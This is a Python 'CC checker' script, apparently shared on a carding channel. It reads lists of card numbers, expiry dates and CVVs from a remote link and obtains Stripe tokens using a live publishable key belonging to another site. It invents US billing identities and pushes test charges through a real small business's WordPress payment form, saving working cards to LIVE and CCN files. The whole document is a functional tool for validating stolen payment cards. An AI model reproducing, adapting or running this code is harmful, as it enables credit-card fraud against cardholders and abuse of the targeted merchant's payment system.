import random
import string
import requests
import colorama
import sys
import time
import io

colorama.init(autoreset=True)

sys.stdout.write(
    f"""{colorama.Fore.BLUE}
░█▀▀█ ░█▀▀█ 
░█─── ░█─── 
░█▄▄█ ░█▄▄█ 
░█▀▀█ ░█─░█ ░█▀▀▀ ░█▀▀█ ░█─▄▀ ░█▀▀▀ ░█▀▀█ 
░█─── ░█▀▀█ ░█▀▀▀ ░█─── ░█▀▄─ ░█▀▀▀ ░█▄▄▀ 
░█▄▄█ ░█─░█ ░█▄▄▄ ░█▄▄█ ░█─░█ ░█▄▄▄ ░█─░█
Welcome To Termux CC Checker.
Contact me on tg @Xbinner2"""
)

amount = int(input(f"\namount=> "))
# p = input("\nproxy remote=> ")

UA = "Mozilla/5.0 (Android 13; Mobile; rv:68.0) Gecko/68.0 Firefox/107.0"


def grab():
    CC = input("\nlink combo➾ ")
    cards = requests.get(CC)
    cc = cards.text.split("\n")
    return cc


def chk(CCN, MM, YY, CVV):
    s = requests.Session()
    # proxies = {"http":p,"https":p}
    # s.proxies.update(proxies)
    head = {
        "user-agent": UA,
        "accept": "application/json, text/plain, */*",
        "content-type": "application/x-www-form-urlencoded",
    }
    r = s.post("https://m.stripe.com/6", headers=head)
    Guid = r.json()["guid"]
    Sid = r.json()["sid"]
    Muid = r.json()["muid"]
    time.sleep(0.5)

    ip = s.get("https://api.ipify.org/")

    res = s.get(f"https://randomuser.me/api?nat=US").json()
    for x in res["results"]:
        First = x["name"]["first"]
        Last = x["name"]["last"]
        Street = (
            f"{x['location']['street']['name']} {x['location']['street']['number']}"
        )
        City = x["location"]["city"]
        State = x["location"]["state"]
        Zip = x["location"]["postcode"]
        Name = f"{First} {Last}"
        Email = f"{First}.{Last}@gmail.com"

    HEADER = {
        "accept": "application/json",
        "content-type": "application/x-www-form-urlencoded",
        "user-agent": UA,
        "accept-language": "en-US,en;q=0.9",
    }

    postdata = {
        "guid": Guid,
        "muid": Muid,
        "sid": Sid,
        "key": "pk_live_4WOpSHSn6SRZyq1Lgv7Zm4Or",
        "card[number]": int(CCN),
        "card[cvc]": int(CVV),
        "card[exp_month]": MM,
        "card[exp_year]": int(YY),
    }

    token = s.post("https://api.stripe.com/v1/tokens", data=postdata, headers=HEADER)
    Id = token.json()["id"]
    TYPE = token.json()["card"]["funding"]
    BRAND = token.json()["card"]["brand"]
    COU = token.json()["card"]["country"]
    time.sleep(1)

    load = {
        "action": "wp_full_stripe_payment_charge",
        "formName": "myform",
        "formNonce": "0648fccb94",
        "fullstripe_address_line1": Street,
        "fullstripe_address_city": City,
        "fullstripe_address_zip": Zip,
        "fullstripe_address_state": State,
        "fullstripe_address_country": "US",
        "fullstripe_name": Name,
        "fullstripe_email": Email,
        "fullstripe_custom_amount": amount,
        "stripeToken": Id,
    }

    header = {
        "accept": "application/json, text/javascript, */*; q=0.01",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "user-agent": UA,
        "accept-language": "en-US,en;q=0.9",
    }

    rx = s.post(
        "https://www.cpadventure.ie/wp-admin/admin-ajax.php", headers=header, data=load
    )
    msg = rx.json()["msg"]
    
    if "declined" in rx.text:
        sys.stdout.write(f"\n{colorama.Fore.RED}[DECLINED]|{int(CCN)}|{MM}|{int(YY)}|{int(CVV)}|{msg}|{TYPE}|{BRAND}|{COU}|{ip.text}|Xbinner2\n")
    
    elif rx.json()["success"] == True:
        sys.stdout.write(
            f"\n{colorama.Fore.GREEN}LIVE|{int(CCN)}|{MM}|{int(YY)}|{int(CVV)}|{msg}|{TYPE}|{BRAND}|{COU}|{ip.text}|Xbinner2\n"
        )
        with io.open("LIVES.txt", "a") as f:
            f.write(f"LIVE|{int(CCN)}|{MM}|{int(YY)}|{int(CVV)}|{msg}|{TYPE}|{BRAND}|{COU}|{ip.text}|Xbinner2\n")

    elif "security code" in rx.text:
        sys.stdout.write(
            f"\n{colorama.Fore.BLUE}CCN|{int(CCN)}|{MM}|{int(YY)}|{int(CVV)}|{msg}|{TYPE}|{BRAND}|{COU}|{ip.text}|Xbinner2\n"
        )
        with io.open("CCN.txt", "a") as f:
            f.write(f"CCN|{int(CCN)}|{MM}|{int(YY)}|{int(CVV)}|{msg}|{TYPE}|{BRAND}|{COU}|{ip.text}|Xbinner2\n")

    else:
        sys.stdout.write(
            f"\n{colorama.Fore.RED}[DECLINED]|{int(CCN)}|{MM}|{int(YY)}|{int(CVV)}|{rx.text}|{TYPE}|{BRAND}|{COU}|{ip.text}|Xbinner2\n"
        )


def main():
    CARDS = grab()
    sys.stdout.write(f"\n{colorama.Fore.BLUE}TOTAL CC: {len(CARDS)}\n")
    for i in CARDS:
        CCN = i.split("|")[0]
        MM = i.split("|")[1]
        YY = i.split("|")[2]
        CVV = i.split("|")[3]
        try:
            chk(CCN, MM, YY, CVV)
            time.sleep(0.5)
        except:
            pass
    print(
        f"\n{colorama.Fore.BLUE}FINISHED! Process done! Checked {colorama.Fore.RED}{len(CARDS)} Tasks\n"
    )


if __name__ == "__main__":
    main()
